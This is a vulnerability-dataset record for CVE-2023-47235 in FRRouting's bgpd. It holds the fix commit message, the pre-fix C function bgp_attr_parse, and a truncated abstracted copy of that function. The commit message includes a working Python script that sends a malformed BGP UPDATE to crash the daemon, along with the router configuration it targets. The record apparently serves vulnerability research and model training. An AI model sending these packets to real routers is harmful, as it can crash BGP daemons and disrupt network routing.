{
  "cve_id": "CVE-2023-47235",
  "cwe_ids": [
    "CWE-Other"
  ],
  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
  "cvss_is_v3": true,
  "repo_name": "FRRouting/frr",
  "commit_msg": "bgpd: Treat EOR as withdrawn to avoid unwanted handling of malformed attrs\n\nTreat-as-withdraw, otherwise if we just ignore it, we will pass it to be\nprocessed as a normal UPDATE without mandatory attributes, that could lead\nto harmful behavior. In this case, a crash for route-maps with the configuration\nsuch as:\n\n```\nrouter bgp 65001\n no bgp ebgp-requires-policy\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n !\n address-family ipv4 unicast\n  neighbor 127.0.0.1 addpath-tx-all-paths\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\nexit\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nSend a malformed optional transitive attribute:\n\n```\nimport socket\nimport time\n\nOPEN = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\x00\\x62\\x01\\x04\\xfd\\xea\\x00\\x5a\\x0a\\x00\\x00\\x01\\x45\\x02\"\nb\"\\x06\\x01\\x04\\x00\\x01\\x00\\x01\\x02\\x02\\x02\\x00\\x02\\x02\\x46\\x00\\x02\"\nb\"\\x06\\x41\\x04\\x00\\x00\\xfd\\xea\\x02\\x02\\x06\\x00\\x02\\x06\\x45\\x04\\x00\"\nb\"\\x01\\x01\\x03\\x02\\x0e\\x49\\x0c\\x0a\\x64\\x6f\\x6e\\x61\\x74\\x61\\x73\\x2d\"\nb\"\\x70\\x63\\x00\\x02\\x04\\x40\\x02\\x00\\x78\\x02\\x09\\x47\\x07\\x00\\x01\\x01\"\nb\"\\x80\\x00\\x00\\x00\")\n\nKEEPALIVE = (b\"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"\nb\"\\xff\\xff\\xff\\xff\\xff\\xff\\x00\\x13\\x04\")\n\nUPDATE = bytearray.fromhex(\"ffffffffffffffffffffffffffffffff002b0200000003c0ff00010100eb00ac100b0b001ad908ac100b0b\")\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect(('127.0.0.2', 179))\ns.send(OPEN)\ndata = s.recv(1024)\ns.send(KEEPALIVE)\ndata = s.recv(1024)\ns.send(UPDATE)\ndata = s.recv(1024)\ntime.sleep(100)\ns.close()\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
  "commit_hash": "6814f2e0138a6ea5e1f83bdd9085d9a77999900b",
  "git_url": "https://github.com/FRRouting/frr/commit/6814f2e0138a6ea5e1f83bdd9085d9a77999900b",
  "file_path": "bgpd/bgp_attr.c",
  "func_name": "bgp_attr_parse",
  "func_before": "enum bgp_attr_parse_ret bgp_attr_parse(struct peer *peer, struct attr *attr,\n\t\t\t\t       bgp_size_t size,\n\t\t\t\t       struct bgp_nlri *mp_update,\n\t\t\t\t       struct bgp_nlri *mp_withdraw)\n{\n\tenum bgp_attr_parse_ret ret;\n\tuint8_t flag = 0;\n\tuint8_t type = 0;\n\tbgp_size_t length = 0;\n\tuint8_t *startp, *endp;\n\tuint8_t *attr_endp;\n\tuint8_t seen[BGP_ATTR_BITMAP_SIZE];\n\t/* we need the as4_path only until we have synthesized the as_path with\n\t * it */\n\t/* same goes for as4_aggregator */\n\tstruct aspath *as4_path = NULL;\n\tas_t as4_aggregator = 0;\n\tstruct in_addr as4_aggregator_addr = {.s_addr = 0};\n\tstruct transit *transit;\n\n\t/* Initialize bitmap. */\n\tmemset(seen, 0, BGP_ATTR_BITMAP_SIZE);\n\n\t/* End pointer of BGP attribute. */\n\tendp = BGP_INPUT_PNT(peer) + size;\n\n\t/* Get attributes to the end of attribute length. */\n\twhile (BGP_INPUT_PNT(peer) < endp) {\n\t\tstartp = BGP_INPUT_PNT(peer);\n\n\t\t/* Fewer than three octets remain (or fewer than four\n\t\t * octets, if the Attribute Flags field has the Extended\n\t\t * Length bit set) when beginning to parse the attribute.\n\t\t * That is, this case exists if there remains unconsumed\n\t\t * data in the path attributes but yet insufficient data\n\t\t * to encode a single minimum-sized path attribute.\n\t\t *\n\t\t * An error condition exists and the \"treat-as-withdraw\"\n\t\t * approach MUST be used (unless some other, more severe\n\t\t * error is encountered dictating a stronger approach),\n\t\t * and the Total Attribute Length MUST be relied upon to\n\t\t * enable the beginning of the NLRI field to be located.\n\t\t */\n\n\t\t/* Check remaining length check.*/\n\t\tif ((endp - startp) < BGP_ATTR_MIN_LEN) {\n\t\t\t/* XXX warning: long int format, int arg (arg 5) */\n\t\t\tflog_warn(\n\t\t\t\tEC_BGP_ATTRIBUTE_TOO_SMALL,\n\t\t\t\t\"%s: error BGP attribute length %lu is smaller than min len\",\n\t\t\t\tpeer->host,\n\t\t\t\t(unsigned long)(endp\n\t\t\t\t\t\t- stream_pnt(BGP_INPUT(peer))));\n\n\t\t\tif (peer->sort != BGP_PEER_EBGP) {\n\t\t\t\tbgp_notify_send(peer->connection,\n\t\t\t\t\t\tBGP_NOTIFY_UPDATE_ERR,\n\t\t\t\t\t\tBGP_NOTIFY_UPDATE_ATTR_LENG_ERR);\n\t\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\t} else {\n\t\t\t\tret = BGP_ATTR_PARSE_WITHDRAW;\n\t\t\t}\n\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* Fetch attribute flag and type.\n\t\t * The lower-order four bits of the Attribute Flags octet are\n\t\t * unused. They MUST be zero when sent and MUST be ignored when\n\t\t * received.\n\t\t */\n\t\tflag = 0xF0 & stream_getc(BGP_INPUT(peer));\n\t\ttype = stream_getc(BGP_INPUT(peer));\n\n\t\t/* Check whether Extended-Length applies and is in bounds */\n\t\tif (CHECK_FLAG(flag, BGP_ATTR_FLAG_EXTLEN)\n\t\t    && ((endp - startp) < (BGP_ATTR_MIN_LEN + 1))) {\n\t\t\tflog_warn(\n\t\t\t\tEC_BGP_EXT_ATTRIBUTE_TOO_SMALL,\n\t\t\t\t\"%s: Extended length set, but just %lu bytes of attr header\",\n\t\t\t\tpeer->host,\n\t\t\t\t(unsigned long)(endp\n\t\t\t\t\t\t- stream_pnt(BGP_INPUT(peer))));\n\n\t\t\tif (peer->sort != BGP_PEER_EBGP) {\n\t\t\t\tbgp_notify_send(peer->connection,\n\t\t\t\t\t\tBGP_NOTIFY_UPDATE_ERR,\n\t\t\t\t\t\tBGP_NOTIFY_UPDATE_ATTR_LENG_ERR);\n\t\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\t} else {\n\t\t\t\tret = BGP_ATTR_PARSE_WITHDRAW;\n\t\t\t}\n\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* Check extended attribue length bit. */\n\t\tif (CHECK_FLAG(flag, BGP_ATTR_FLAG_EXTLEN))\n\t\t\tlength = stream_getw(BGP_INPUT(peer));\n\t\telse\n\t\t\tlength = stream_getc(BGP_INPUT(peer));\n\n\t\t/* Overflow check. */\n\t\tattr_endp = BGP_INPUT_PNT(peer) + length;\n\n\t\tif (attr_endp > endp) {\n\t\t\tflog_warn(\n\t\t\t\tEC_BGP_ATTRIBUTE_TOO_LARGE,\n\t\t\t\t\"%s: BGP type %d length %d is too large, attribute total length is %d.  attr_endp is %p.  endp is %p\",\n\t\t\t\tpeer->host, type, length, size, attr_endp,\n\t\t\t\tendp);\n\n\t\t\t/* Only relax error handling for eBGP peers */\n\t\t\tif (peer->sort != BGP_PEER_EBGP) {\n\t\t\t\t/*\n\t\t\t\t * RFC 4271 6.3\n\t\t\t\t * If any recognized attribute has an Attribute\n\t\t\t\t * Length that conflicts with the expected length\n\t\t\t\t * (based on the attribute type code), then the\n\t\t\t\t * Error Subcode MUST be set to Attribute Length\n\t\t\t\t * Error.  The Data field MUST contain the erroneous\n\t\t\t\t * attribute (type, length, and value).\n\t\t\t\t * ----------\n\t\t\t\t * We do not currently have a good way to determine the\n\t\t\t\t * length of the attribute independent of the length\n\t\t\t\t * received in the message. Instead we send the\n\t\t\t\t * minimum between the amount of data we have and the\n\t\t\t\t * amount specified by the attribute length field.\n\t\t\t\t *\n\t\t\t\t * Instead of directly passing in the packet buffer and\n\t\t\t\t * offset we use the stream_get* functions to read into\n\t\t\t\t * a stack buffer, since they perform bounds checking\n\t\t\t\t * and we are working with untrusted data.\n\t\t\t\t */\n\t\t\t\tunsigned char ndata[peer->max_packet_size];\n\n\t\t\t\tmemset(ndata, 0x00, sizeof(ndata));\n\t\t\t\tsize_t lfl =\n\t\t\t\t\tCHECK_FLAG(flag, BGP_ATTR_FLAG_EXTLEN) ? 2 : 1;\n\t\t\t\t/* Rewind to end of flag field */\n\t\t\t\tstream_rewind_getp(BGP_INPUT(peer), (1 + lfl));\n\t\t\t\t/* Type */\n\t\t\t\tstream_get(&ndata[0], BGP_INPUT(peer), 1);\n\t\t\t\t/* Length */\n\t\t\t\tstream_get(&ndata[1], BGP_INPUT(peer), lfl);\n\t\t\t\t/* Value */\n\t\t\t\tsize_t atl = attr_endp - startp;\n\t\t\t\tsize_t ndl = MIN(atl, STREAM_READABLE(BGP_INPUT(peer)));\n\n\t\t\t\tstream_get(&ndata[lfl + 1], BGP_INPUT(peer), ndl);\n\n\t\t\t\tbgp_notify_send_with_data(peer->connection,\n\t\t\t\t\t\t\t  BGP_NOTIFY_UPDATE_ERR,\n\t\t\t\t\t\t\t  BGP_NOTIFY_UPDATE_ATTR_LENG_ERR,\n\t\t\t\t\t\t\t  ndata, ndl + lfl + 1);\n\n\t\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\t\tgoto done;\n\t\t\t} else {\n\t\t\t\t/* Handling as per RFC7606 section 4, treat-as-withdraw approach\n\t\t\t\t * must be followed when the total attribute length is in conflict\n\t\t\t\t * with the enclosed path attribute length.\n\t\t\t\t */\n\t\t\t\tflog_warn(\n\t\t\t\t\tEC_BGP_ATTRIBUTE_PARSE_WITHDRAW,\n\t\t\t\t\t\"%s: Attribute %s, parse error - treating as withdrawal\",\n\t\t\t\t\tpeer->host, lookup_msg(attr_str, type, NULL));\n\t\t\t\tret = BGP_ATTR_PARSE_WITHDRAW;\n\t\t\t\tstream_forward_getp(BGP_INPUT(peer), endp - BGP_INPUT_PNT(peer));\n\t\t\t\tgoto done;\n\t\t\t}\n\t\t}\n\n\t\t/* If attribute appears more than once in the UPDATE message,\n\t\t * for MP_REACH_NLRI & MP_UNREACH_NLRI attributes\n\t\t * the Error Subcode is set to Malformed Attribute List.\n\t\t * For all other attributes, all the occurances of the attribute\n\t\t * other than the first occurence is discarded. (RFC7606 3g)\n\t\t */\n\n\t\tif (CHECK_BITMAP(seen, type)) {\n\t\t\t/* Only relax error handling for eBGP peers */\n\t\t\tif (peer->sort != BGP_PEER_EBGP ||\n\t\t\t\t\ttype == BGP_ATTR_MP_REACH_NLRI || type == BGP_ATTR_MP_UNREACH_NLRI) {\n\t\t\t\tflog_warn(\n\t\t\t\t\tEC_BGP_ATTRIBUTE_REPEATED,\n\t\t\t\t\t\"%s: error BGP attribute type %d appears twice in a message\",\n\t\t\t\t\tpeer->host, type);\n\n\t\t\t\tbgp_notify_send(peer->connection,\n\t\t\t\t\t\tBGP_NOTIFY_UPDATE_ERR,\n\t\t\t\t\t\tBGP_NOTIFY_UPDATE_MAL_ATTR);\n\t\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\t\tgoto done;\n\t\t\t} else {\n\t\t\t\tflog_warn(\n\t\t\t\t\tEC_BGP_ATTRIBUTE_REPEATED,\n\t\t\t\t\t\"%s: error BGP attribute type %d appears twice in a message - discard attribute\",\n\t\t\t\t\tpeer->host, type);\n\t\t\t\t/* Adjust the stream getp to the end of the attribute, in case we\n\t\t\t\t * haven't read all the attributes.\n\t\t\t\t */\n\t\t\t\tstream_set_getp(BGP_INPUT(peer),\n\t\t\t\t\t(startp - STREAM_DATA(BGP_INPUT(peer))) + (attr_endp - startp));\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\t/* Set type to bitmap to check duplicate attribute.  `type' is\n\t\t   unsigned char so it never overflow bitmap range. */\n\n\t\tSET_BITMAP(seen, type);\n\n\t\tstruct bgp_attr_parser_args attr_args = {\n\t\t\t.peer = peer,\n\t\t\t.length = length,\n\t\t\t.attr = attr,\n\t\t\t.type = type,\n\t\t\t.flags = flag,\n\t\t\t.startp = startp,\n\t\t\t.total = attr_endp - startp,\n\t\t};\n\n\n\t\t/* If any recognized attribute has Attribute Flags that conflict\n\t\t   with the Attribute Type Code, then the Error Subcode is set\n\t\t   to\n\t\t   Attribute Flags Error.  The Data field contains the erroneous\n\t\t   attribute (type, length and value). */\n\t\tif (bgp_attr_flag_invalid(&attr_args)) {\n\t\t\tret = bgp_attr_malformed(\n\t\t\t\t&attr_args, BGP_NOTIFY_UPDATE_ATTR_FLAG_ERR,\n\t\t\t\tattr_args.total);\n\t\t\tif (ret == BGP_ATTR_PARSE_PROCEED)\n\t\t\t\tcontinue;\n\t\t\tstream_forward_getp(BGP_INPUT(peer), endp - BGP_INPUT_PNT(peer));\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* OK check attribute and store it's value. */\n\t\tswitch (type) {\n\t\tcase BGP_ATTR_ORIGIN:\n\t\t\tret = bgp_attr_origin(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_AS_PATH:\n\t\t\tret = bgp_attr_aspath(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_AS4_PATH:\n\t\t\tret = bgp_attr_as4_path(&attr_args, &as4_path);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_NEXT_HOP:\n\t\t\tret = bgp_attr_nexthop(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_MULTI_EXIT_DISC:\n\t\t\tret = bgp_attr_med(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_LOCAL_PREF:\n\t\t\tret = bgp_attr_local_pref(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_ATOMIC_AGGREGATE:\n\t\t\tret = bgp_attr_atomic(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_AGGREGATOR:\n\t\t\tret = bgp_attr_aggregator(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_AS4_AGGREGATOR:\n\t\t\tret = bgp_attr_as4_aggregator(&attr_args,\n\t\t\t\t\t\t      &as4_aggregator,\n\t\t\t\t\t\t      &as4_aggregator_addr);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_COMMUNITIES:\n\t\t\tret = bgp_attr_community(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_LARGE_COMMUNITIES:\n\t\t\tret = bgp_attr_large_community(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_ORIGINATOR_ID:\n\t\t\tret = bgp_attr_originator_id(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_CLUSTER_LIST:\n\t\t\tret = bgp_attr_cluster_list(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_MP_REACH_NLRI:\n\t\t\tret = bgp_mp_reach_parse(&attr_args, mp_update);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_MP_UNREACH_NLRI:\n\t\t\tret = bgp_mp_unreach_parse(&attr_args, mp_withdraw);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_EXT_COMMUNITIES:\n\t\t\tret = bgp_attr_ext_communities(&attr_args);\n\t\t\tbreak;\n#ifdef ENABLE_BGP_VNC_ATTR\n\t\tcase BGP_ATTR_VNC:\n#endif\n\t\tcase BGP_ATTR_ENCAP:\n\t\t\tret = bgp_attr_encap(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_PREFIX_SID:\n\t\t\tret = bgp_attr_prefix_sid(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_PMSI_TUNNEL:\n\t\t\tret = bgp_attr_pmsi_tunnel(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_IPV6_EXT_COMMUNITIES:\n\t\t\tret = bgp_attr_ipv6_ext_communities(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_OTC:\n\t\t\tret = bgp_attr_otc(&attr_args);\n\t\t\tbreak;\n\t\tcase BGP_ATTR_AIGP:\n\t\t\tret = bgp_attr_aigp(&attr_args);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tret = bgp_attr_unknown(&attr_args);\n\t\t\tbreak;\n\t\t}\n\n\t\tif (ret == BGP_ATTR_PARSE_ERROR_NOTIFYPLS) {\n\t\t\tbgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,\n\t\t\t\t\tBGP_NOTIFY_UPDATE_MAL_ATTR);\n\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\tgoto done;\n\t\t}\n\n\t\tif (ret == BGP_ATTR_PARSE_ERROR) {\n\t\t\tflog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,\n\t\t\t\t  \"%s: Attribute %s, parse error\", peer->host,\n\t\t\t\t  lookup_msg(attr_str, type, NULL));\n\t\t\tgoto done;\n\t\t}\n\t\tif (ret == BGP_ATTR_PARSE_WITHDRAW) {\n\t\t\tflog_warn(\n\t\t\t\tEC_BGP_ATTRIBUTE_PARSE_WITHDRAW,\n\t\t\t\t\"%s: Attribute %s, parse error - treating as withdrawal\",\n\t\t\t\tpeer->host, lookup_msg(attr_str, type, NULL));\n\t\t\tstream_forward_getp(BGP_INPUT(peer), endp - BGP_INPUT_PNT(peer));\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* Check the fetched length. */\n\t\tif (BGP_INPUT_PNT(peer) != attr_endp) {\n\t\t\tflog_warn(EC_BGP_ATTRIBUTE_FETCH_ERROR,\n\t\t\t\t  \"%s: BGP attribute %s, fetch error\",\n\t\t\t\t  peer->host, lookup_msg(attr_str, type, NULL));\n\t\t\tbgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,\n\t\t\t\t\tBGP_NOTIFY_UPDATE_ATTR_LENG_ERR);\n\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\tgoto done;\n\t\t}\n\t}\n\n\t/*\n\t * draft-ietf-idr-bgp-prefix-sid-27#section-3:\n\t * About Prefix-SID path attribute,\n\t * Label-Index TLV(type1) and The Originator SRGB TLV(type-3)\n\t * may only appear in a BGP Prefix-SID attribute attached to\n\t * IPv4/IPv6 Labeled Unicast prefixes ([RFC8277]).\n\t * It MUST be ignored when received for other BGP AFI/SAFI combinations.\n\t */\n\tif (!attr->mp_nexthop_len || mp_update->safi != SAFI_LABELED_UNICAST)\n\t\tattr->label_index = BGP_INVALID_LABEL_INDEX;\n\n\t/* Check final read pointer is same as end pointer. */\n\tif (BGP_INPUT_PNT(peer) != endp) {\n\t\tflog_warn(EC_BGP_ATTRIBUTES_MISMATCH,\n\t\t\t  \"%s: BGP attribute %s, length mismatch\", peer->host,\n\t\t\t  lookup_msg(attr_str, type, NULL));\n\t\tbgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,\n\t\t\t\tBGP_NOTIFY_UPDATE_ATTR_LENG_ERR);\n\n\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\tgoto done;\n\t}\n\n\t/*\n\t * RFC4271: If the NEXT_HOP attribute field is syntactically incorrect,\n\t * then the Error Subcode MUST be set to Invalid NEXT_HOP Attribute.\n\t * This is implemented below and will result in a NOTIFICATION. If the\n\t * NEXT_HOP attribute is semantically incorrect, the error SHOULD be\n\t * logged, and the route SHOULD be ignored. In this case, a NOTIFICATION\n\t * message SHOULD NOT be sent. This is implemented elsewhere.\n\t *\n\t * RFC4760: An UPDATE message that carries no NLRI, other than the one\n\t * encoded in the MP_REACH_NLRI attribute, SHOULD NOT carry the NEXT_HOP\n\t * attribute. If such a message contains the NEXT_HOP attribute, the BGP\n\t * speaker that receives the message SHOULD ignore this attribute.\n\t */\n\tif (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_NEXT_HOP))\n\t    && !CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_MP_REACH_NLRI))) {\n\t\tif (bgp_attr_nexthop_valid(peer, attr) < 0) {\n\t\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\t\tgoto done;\n\t\t}\n\t}\n\n\t/* Check all mandatory well-known attributes are present */\n\tret = bgp_attr_check(peer, attr, length);\n\tif (ret < 0)\n\t\tgoto done;\n\n\t/*\n\t * At this place we can see whether we got AS4_PATH and/or\n\t * AS4_AGGREGATOR from a 16Bit peer and act accordingly.\n\t * We can not do this before we've read all attributes because\n\t * the as4 handling does not say whether AS4_PATH has to be sent\n\t * after AS_PATH or not - and when AS4_AGGREGATOR will be send\n\t * in relationship to AGGREGATOR.\n\t * So, to be defensive, we are not relying on any order and read\n\t * all attributes first, including these 32bit ones, and now,\n\t * afterwards, we look what and if something is to be done for as4.\n\t *\n\t * It is possible to not have AS_PATH, e.g. GR EoR and sole\n\t * MP_UNREACH_NLRI.\n\t */\n\t/* actually... this doesn't ever return failure currently, but\n\t * better safe than sorry */\n\tif (CHECK_FLAG(attr->flag, ATTR_FLAG_BIT(BGP_ATTR_AS_PATH))\n\t    && bgp_attr_munge_as4_attrs(peer, attr, as4_path, as4_aggregator,\n\t\t\t\t\t&as4_aggregator_addr)) {\n\t\tbgp_notify_send(peer->connection, BGP_NOTIFY_UPDATE_ERR,\n\t\t\t\tBGP_NOTIFY_UPDATE_MAL_ATTR);\n\t\tret = BGP_ATTR_PARSE_ERROR;\n\t\tgoto done;\n\t}\n\n\t/*\n\t * Finally do the checks on the aspath we did not do yet\n\t * because we waited for a potentially synthesized aspath.\n\t */\n\tif (attr->flag & (ATTR_FLAG_BIT(BGP_ATTR_AS_PATH))) {\n\t\tret = bgp_attr_aspath_check(peer, attr);\n\t\tif (ret != BGP_ATTR_PARSE_PROCEED)\n\t\t\tgoto done;\n\t}\n\n\tret = BGP_ATTR_PARSE_PROCEED;\ndone:\n\n\t/*\n\t * At this stage, we have done all fiddling with as4, and the\n\t * resulting info is in attr->aggregator resp. attr->aspath so\n\t * we can chuck as4_aggregator and as4_path alltogether in order\n\t * to save memory\n\t */\n\t/*\n\t * unintern - it is in the hash\n\t * The flag that we got this is still there, but that\n\t * does not do any trouble\n\t */\n\taspath_unintern(&as4_path);\n\n\ttransit = bgp_attr_get_transit(attr);\n\tif (ret != BGP_ATTR_PARSE_ERROR) {\n\t\t/* Finally intern unknown attribute. */\n\t\tif (transit)\n\t\t\tbgp_attr_set_transit(attr, transit_intern(transit));\n\t\tif (attr->encap_subtlvs)\n\t\t\tattr->encap_subtlvs = encap_intern(attr->encap_subtlvs,\n\t\t\t\t\t\t\t   ENCAP_SUBTLV_TYPE);\n#ifdef ENABLE_BGP_VNC\n\t\tstruct bgp_attr_encap_subtlv *vnc_subtlvs =\n\t\t\tbgp_attr_get_vnc_subtlvs(attr);\n\n\t\tif (vnc_subtlvs)\n\t\t\tbgp_attr_set_vnc_subtlvs(\n\t\t\t\tattr,\n\t\t\t\tencap_intern(vnc_subtlvs, VNC_SUBTLV_TYPE));\n#endif\n\t} else {\n\t\tif (transit) {\n\t\t\ttransit_free(transit);\n\t\t\tbgp_attr_set_transit(attr, NULL);\n\t\t}\n\n\t\tbgp_attr_flush_encap(attr);\n\t};\n\n\t/* Sanity checks */\n\ttransit = bgp_attr_get_transit(attr);\n\tif (transit)\n\t\tassert(transit->refcnt > 0);\n\tif (attr->encap_subtlvs)\n\t\tassert(attr->encap_subtlvs->refcnt > 0);\n#ifdef ENABLE_BGP_VNC\n\tstruct bgp_attr_encap_subtlv *vnc_subtlvs =\n\t\tbgp_attr_get_vnc_subtlvs(attr);\n\n\tif (vnc_subtlvs)\n\t\tassert(vnc_subtlvs->refcnt > 0);\n#endif\n\n\treturn ret;\n}",
  "abstract_func_before": "enum bgp_attr_parse_ret bgp_attr_parse(struct peer *peer, struct attr *attr,\n\t\t\t\t       bgp_size_t VAR_0,\n\t\t\t\t       struct bgp_nlri *VAR_1,\n\t\t\t\t       struct bgp_nlri *VAR_2)\n{\n\tenum bgp_attr_parse_ret VAR_3;\n\tuint8_t VAR_4 = 0;\n\tuint8_t VAR_5 = 0;\n\tbgp_size_t VAR_6 = 0;\n\tuint8_t *VAR_7, *VAR_8;\n\tuint8_t *VAR_9;\n\tuint8_t VAR_10[VAR_11];\n\t/* COMMENT_0 */\n         \n\t/* COMMENT_2 */\n\tstruct aspath *VAR_12 = NULL;\n\tas_t VAR_13 = 0;\n\tstruct in_addr VAR_14 = {.s_addr = 0};\n\tstruct transit *transit;\n\n\t/* COMMENT_3 */\n\tmemset(VAR_10, 0, VAR_11);\n\n\t/* COMMENT_4 */\n\tVAR_8 = BGP_INPUT_PNT(peer) + VAR_0;\n\n\t/* COMMENT_5 */\n\twhile (BGP_INPUT_PNT(peer) < VAR_8) {\n\t\tVAR_7 = BGP_INPUT_PNT(peer);\n\n\t\t/* COMMENT_6 */\n                                                          \n                                                           \n                                                          \n                                                          \n                                                     \n    \n                                                          \n                                                          \n                                                         \n                                                          \n                                                          \n     \n\n\t\t/* COMMENT_19 */\n\t\tif ((VAR_8 - VAR_7) < VAR_15) {\n\t\t\t/* COMMENT_20 */\n\t\t\tflog_warn(\n\t\t\t\tVAR_16,\n\t\t\t\t\"%s: error BGP attribute length %lu is smaller than min len\",\n\t\t\t\tpeer->host,\n\t\t\t\t(unsigned long)(VAR_8\n\t\t\t\t\t\t- stream_pnt(BGP_INPUT(peer))));\n\n\t\t\tif (peer->sort != VAR_17) {\n\t\t\t\tbgp_notify_send(peer->connection,\n\t\t\t\t\t\tVAR_18,\n\t\t\t\t\t\tVAR_19);\n\t\t\t\tVAR_3 = VAR_20;\n\t\t\t} else {\n\t\t\t\tVAR_3 = VAR_21;\n\t\t\t}\n\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* COMMENT_21 */\n                                                               \n                                                                 \n              \n     \n\t\tVAR_4 = 0xF0 & stream_getc(BGP_INPUT(peer));\n\t\tVAR_5 = stream_getc(BGP_INPUT(peer));\n\n\t\t/* COMMENT_26 */\n\t\tif (CHECK_FLAG(VAR_4, VAR_22)\n\t\t    && ((VAR_8 - VAR_7) < (VAR_15 + 1))) {\n\t\t\tflog_warn(\n\t\t\t\tVAR_23,\n\t\t\t\t\"%s: Extended length set, but just %lu bytes of attr header\",\n\t\t\t\tpeer->host,\n\t\t\t\t(unsigned long)(VAR_8\n\t\t\t\t\t\t- stream_pnt(BGP_INPUT(peer))));\n\n\t\t\tif (peer->sort != VAR_17) {\n\t\t\t\tbgp_notify_send(peer->connection,\n\t\t\t\t\t\tVAR_18,\n\t\t\t\t\t\tVAR_19);\n\t\t\t\tVAR_3 = VAR_20;\n\t\t\t} else {\n\t\t\t\tVAR_3 = VAR_21;\n\t\t\t}\n\n\t\t\tgoto done;\n\t\t}\n\n\t\t/* COMMENT_27 */\n\t\tif (CHECK_FLAG(VAR_4, VAR_22))\n\t\t\tVAR_6 = stream_getw(BGP_INPUT(peer));\n\t\telse\n\t\t\tVAR_6 = stream_getc(BGP_INPUT(peer));\n\n\t\t/* COMMENT_28 */\n\t\tVAR_9 = BGP_INPUT_PNT(peer) + VAR_6;\n\n\t\tif (VAR_9 > VAR_8) {\n\t\t\tflog_warn(\n\t\t\t\tVAR_24,\n\t\t\t\t\"%s: BGP type %d length %d is too large, attribute total length is %d.  attr_endp is %p.  endp is %p\",\n\t\t\t\tpeer->host, VAR_5, VAR_6, VAR_0, VAR_9,\n\t\t\t\tVAR_8);\n\n\t\t\t/* COMMENT_29 */\n\t\t\tif (peer->sort != VAR_17) {\n\t\t\t\t/* COMMENT_30 */\n                   \n                                                   \n                                                     \n                                                   \n                                                    \n                                                        \n                                           \n                 \n                                                           \n                                                        \n                                                   \n                                                         \n                                                      \n      \n                                                           \n                                                           \n                                                         \n                                              \n       \n\t\t\t\tunsigned char VAR_25[peer->max_packet_size];\n\n\t\t\t\tmemset(VAR_25, 0x00, sizeof(VAR_25));\n\t\t\t\tsize_t VAR_26 =\n\t\t\t\t\tCHECK_FLAG(VAR_4, VAR_22) ? 2 : 1;\n\t\t\t\t/* COMMENT_50 */\n\t\t\t\tstream_rewind_getp(BGP_INPUT(peer), (1 + VAR_26));\n\t\t\t\t/* COMMENT_51 */\n\t\t\t\tstream_get(&VAR_25[0], BGP_INPUT(peer), 1);\n\t\t\t\t/* COMMENT_52 */\n\t\t\t\tstream_get(&VAR_25[1], BGP_INPUT(peer), VAR_26);\n\t\t\t\t/* COMMENT_53 */\n\t\t\t\tsize_t VAR_27 = VAR_9 - VAR_7;\n\t\t\t\tsize_t VAR_28 = MIN(VAR_27, STREAM_READABLE(BGP_INPUT(peer)));\n\n\t\t\t\tstream_get(&VAR_25[VAR_26 + 1], BGP_INPUT(peer), VAR_28);\n\n\t\t\t\tbgp_notify_send_with_data(peer->connection,\n\t\t\t\t\t\t\t  VAR_18,\n\t\t\t\t\t\t\t  VAR_19,\n\t\t\t\t\t\t\t  VAR_25, VAR_28 + VAR_26 + 1);\n\n\t\t\t\tVAR_3 = VAR_20;\n\t\t\t\tgoto done;\n\t\t\t} else {\n\t\t\t\t/* 